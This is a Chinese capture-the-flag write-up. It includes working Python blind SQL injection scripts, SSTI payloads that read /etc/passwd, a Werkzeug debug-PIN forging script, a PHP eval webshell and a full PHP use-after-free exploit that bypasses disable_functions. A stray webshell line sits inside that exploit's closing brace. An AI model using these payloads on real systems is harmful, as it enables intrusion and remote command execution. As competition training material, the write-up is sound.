 @[toc]
 # 公益赛

---
## day1
### 签到

- 观看视频，最后得到flag

### code_in_morse

- 先用 CyberChef得到一张图片

- 得到的图片扫描后得到一个图片

- f5隐写得到flag 

### web
- 弱口令admin admin888 登陆
- 在search界面发现注入点，用sqlmap配置cookie直接爆破

### ezupload

- 上传一句话木马
- 执行 bash -c /readflag > tmp
- 执行 cat tmp

## day2
### easysqli_copy

- 审计代码。发现可以利用宽字节注入使用'，再使用时间盲注获取数据，构造paylaod闭合语句
- 过滤了select，但是可以用concat+char构造select
- 用set+prepare+execute 来读取数据
- 先读表名table1再读列名fllllll4g，最后爆破flag
```python

import requests
url = ''
res = ''
for i in range(1,43):
    for s  in range(45,126):
        t1 = 'select if(ascii(substr((select fllllll4g from table1),{},1))={},sleep(10),1)'.format(i,s)
        t2 = ''
        for k in t1:
            t2 += 'char({}),'.format(ord(k))
        t3 = "set @t1=concat({});PREPARE t2 FROM @t1;EXECUTE t2;||{}%271{}%27={}%271".format(t2[:-1],"%df","%df","%df")
        payload = '?id=1{}%27;{}'.format('%df',t3)
        try:
            re1 = requests.get(url+payload,timeout=5)
        except Exception as e:
            res += chr(s)
            print(res)
            break
print('res:'+res)

```


### Ezsqli

- 通过测试发现 8 || 1=1 回显Nu1L，8 || 1=0 不回显，所以可以实现盲注
- 测试得过滤了 in 和 union select
- 首先爆表，但是过滤了in 所以用`select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{},1) `
- 得到表名`f1ag_1s_h3r3_hhhhh`
- 获取数据采用无列名注入，参考的paylaod是`
(select 'admin','admin')>(select * from users limit 1)`

- 构造最终payload
```python

import requests
from lxml import etree
def get_data(payload):
    url = ''
    data = {
            'id':payload
            }
    req = requests.post(url,data=data) 
    data = req.text
    return data
res = ''
for i in range(1,100):
    flag = 0
    for j in range(45,126):
        a1 = str(hex(j)).replace('0x','')
        a2 = ''
        for k in res:
            a2 += str(hex(ord(k))).replace('0x','')
        # f1ag_1s_h3r3_hhhhh
        payload = "id=9|| (( select 1,0x{} )> (select * from (f1ag_1s_h3r3_hhhhh)))".format(a2+a1)
        # print(payload)
        data = get_data(payload)
        if 'hacker' in  data:
            exit(-1)
        if 'Nu1L' in data:
            print(chr(j-1))
            res += chr(j-1)
            flag = 1
            print(res)
            break
    if flag:
        pass
    else:
        break
    
print(res)

```


### blacklist

- 类似强网杯的随便注
- 但是用随便注的方法只能获取到表名和列名
- 于是尝试用handler
- 构造paylaod `inject=1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;`
- 获得flag

## day3

### Flaskapp

- 利用base64decode进行ssti模板注入读取文件
```python 

config e3tjb25maWd9fQ== 'SECRET_KEY': 's_e_c_r_e_t_k_e_y',
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %}  
eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9wYXNzd2QnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9

/sys/class/net/eth0/address
eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3N5cy9jbGFzcy9uZXQvZXRoMC9hZGRyZXNzJywgJ3InKS5yZWFkKCkgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfQ==
02:42:ac:12:00:06
2485377957894
/proc/self/cgroup
eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9

12:perf_event:/docker/97e3793194a6e8c1ea3c5081158f336f3f46797be8f44207ee5ed3b49f85ea1f
```


- 利用读取的信息构造pin码
```python
import hashlib
from itertools import chain
probably_public_bits = [
	'flaskweb',# 	
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	# str(uuid.getnode()),  /sys/class/net/ens33/address  /sys/class/net/eth0/address
    #02:42:ac:16:00:06
	'2485377957894',
	# get_machine_id(), /etc/machin-id /proc/self/cgroup 6afeacdf-afcf-4552-8502-719172374dda
	'97e3793194a6e8c1ea3c5081158f336f3f46797be8f44207ee5ed3b49f85ea1f'
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print(rv)

```

- 利用pin码进入debug界面
- 读取flag

```python

import os

os.listdir('/')

open('jibuqingle.txt','r').read()

```


### easy_thinking

- 通过测试发现是tp6框架
- 搜索到tp6有任意文件操作漏洞
- 测试得/runtime/session/文件夹存在
- 于是修改session为.php结尾
- 查看session文件，可以发现储存的是搜索历史
- 在搜索框搜索`<?php @eval($_GET['rdd']);?>`
- 然后连接shell
- 执行phpinfo(),发现禁用了好多函数
- 没法直接命令执行
- 考虑bypass，使用bypass脚本
- 最后用copy函数远程复制脚本
- 运行脚本得flag


```php

<?php
pwn("/readflag");
function pwn($cmd) {
 global $abc, $helper;
 function str2ptr(&$str, $p = 0, $s = 8) {
 $address = 0;
 for($j = $s-1; $j >= 0; $j--) {
 $address <<= 8;
 $address |= ord($str[$p+$j]);
 }
 return $address;
 }
 function ptr2str($ptr, $m = 8) {
 $out = "";
 for ($i=0; $i < $m; $i++) {
 $out .= chr($ptr & 0xff);
 $ptr >>= 8;
 }
 return $out;
 }
 function write(&$str, $p, $v, $n = 8) {
 $i = 0;
 for($i = 0; $i < $n; $i++) {
 $str[$p + $i] = chr($v & 0xff);
 $v >>= 8;
 }
 }
 function leak($addr, $p = 0, $s = 8) {
 global $abc, $helper;
 write($abc, 0x68, $addr + $p - 0x10);
 $leak = strlen($helper->a);
 if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
 return $leak;
 }
 function parse_elf($base) {
 $e_type = leak($base, 0x10, 2);
 $e_phoff = leak($base, 0x20);
 $e_phentsize = leak($base, 0x36, 2);
 $e_phnum = leak($base, 0x38, 2);
 for($i = 0; $i < $e_phnum; $i++) {
 $header = $base + $e_phoff + $i * $e_phentsize;
 $p_type = leak($header, 0, 4);
 $p_flags = leak($header, 4, 4);
 $p_vaddr = leak($header, 0x10);
 $p_memsz = leak($header, 0x28);
 if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
 # handle pie
 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
 $data_size = $p_memsz;
 } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
 $text_size = $p_memsz;
 }
 }
 if(!$data_addr || !$text_size || !$data_size)
 return false;
 return [$data_addr, $text_size, $data_size];
 }
 function get_basic_funcs($base, $elf) {
 list($data_addr, $text_size, $data_size) = $elf;
 for($i = 0; $i < $data_size / 8; $i++) {
 $leak = leak($data_addr, $i * 8);
 if($leak - $base > 0 && $leak - $base < $text_size) {
 $deref = leak($leak);
 # 'constant' constant check
 if($deref != 0x746e6174736e6f63)
 continue;
 } else continue;
 $leak = leak($data_addr, ($i + 4) * 8);
 if($leak - $base > 0 && $leak - $base < $text_size) {
 $deref = leak($leak);
 # 'bin2hex' constant check
 if($deref != 0x786568326e6962)
 continue;
 } else continue;
 return $data_addr + $i * 8;
 }
 }
 function get_binary_base($binary_leak) {
 $base = 0;
 $start = $binary_leak & 0xfffffffffffff000;
 for($i = 0; $i < 0x1000; $i++) {
 $addr = $start - 0x1000 * $i;
 $leak = leak($addr, 0, 7);
 if($leak == 0x10102464c457f) { # ELF header
 return $addr;
 }
 }
 }
 function get_system($basic_funcs) {
 $addr = $basic_funcs;
 do {
 $f_entry = leak($addr);
 $f_name = leak($f_entry, 0, 6);
 if($f_name == 0x6d6574737973) { # system
 return leak($addr + 8);
 }
 $addr += 0x20;
 } while($f_entry != 0);
 return false;
 }
 class ryat {
 var $ryat;
 var $chtg;
 function __destruct()
 {
 $this->chtg = $this->ryat;
 $this->ryat = 1;
 }
 }
 class Helper {
 public $a, $b, $c, $d;
 }
 if(stristr(PHP_OS, 'WIN')) {
 die('This PoC is for *nix systems only.');
 }
 $n_alloc = 10; # increase this value if you get segfaults
 $contiguous = [];
 for($i = 0; $i < $n_alloc; $i++)
 $contiguous[] = str_repeat('A', 79);
 $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
 $out = unserialize($poc);
 gc_collect_cycles();
 $v = [];
 $v[0] = ptr2str(0, 79);
 unset($v);
 $abc = $out[2][0];
 $helper = new Helper;
 $helper->b = function ($x) { };
 if(strlen($abc) == 79 || strlen($abc) == 0) {
 die("UAF failed");
 }
 # leaks
 $closure_handlers = str2ptr($abc, 0);
 $php_heap = str2ptr($abc, 0x58);
 $abc_addr = $php_heap - 0xc8;
 # fake value
 write($abc, 0x60, 2);
 write($abc, 0x70, 6);
 # fake reference
 write($abc, 0x10, $abc_addr + 0x60);
 write($abc, 0x18, 0xa);
 $closure_obj = str2ptr($abc, 0x20);
 $binary_leak = leak($closure_handlers, 8);
 if(!($base = get_binary_base($binary_leak))) {
 die("Couldn't determine binary base address");
 }
 if(!($elf = parse_elf($base))) {
 die("Couldn't parse ELF header");
 }
 if(!($basic_funcs = get_basic_funcs($base, $elf))) {
 die("Couldn't get basic_functions address");
 }
 if(!($zif_system = get_system($basic_funcs))) {
 die("Couldn't get zif_system address");
 }
 # fake closure object
 $fake_obj_offset = 0xd0;
 for($i = 0; $i < 0x110; $i += 8) {
 write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
 }
 # pwn
 write($abc, 0x20, $abc_addr + $fake_obj_offset);
 write($abc, 0xd0 + 0x38, 1, 4); # internal func type
 write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
 ($helper->b)($cmd);
 exit();<?php @eval($_GET['rdd']);?>
}

```
